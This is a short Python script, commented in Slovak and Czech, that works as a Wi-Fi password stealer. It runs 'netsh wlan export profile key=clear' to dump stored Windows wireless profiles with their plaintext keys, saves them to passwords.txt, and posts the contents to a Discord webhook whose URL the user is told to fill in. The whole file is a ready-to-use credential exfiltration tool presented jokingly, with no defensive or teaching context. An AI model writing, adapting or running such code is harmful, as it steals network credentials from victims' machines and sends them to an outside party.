import subprocess
import os
import requests

# Discord webhook URL
discord_webhook_url = 'Sem napis TVOJ Discord WebHook Link'

password_file = open('passwords.txt', "w")
password_file.write("Helloouuuu toii su hesielka:\n🧨🧨\n")
password_file.close()

# Listy
wifi_files = []
wifi_names = []
wifi_passwords = []

command_output = subprocess.run(["netsh", "wlan", "export", "profile", "key=clear"], capture_output=True).stdout.decode()

path = os.getcwd()
#Zapise do suboru
with open('passwords.txt', 'a') as password_file:
    password_file.write(command_output)

# Precita to
with open('passwords.txt', 'r') as password_file:
    content = password_file.read()

# Ulozi to do jsonu (nejako)
discord_data = {
    'content': f"🚀 **Vole noví Zprávii !** 🚀\n\n{content}\n\n🔐 * Pip Puup!* 🔐"
}

# Odosle data na Discord WebHook
response = requests.post(discord_webhook_url, json=discord_data)

print("Data sent to Discord webhook. Feel the drama!")
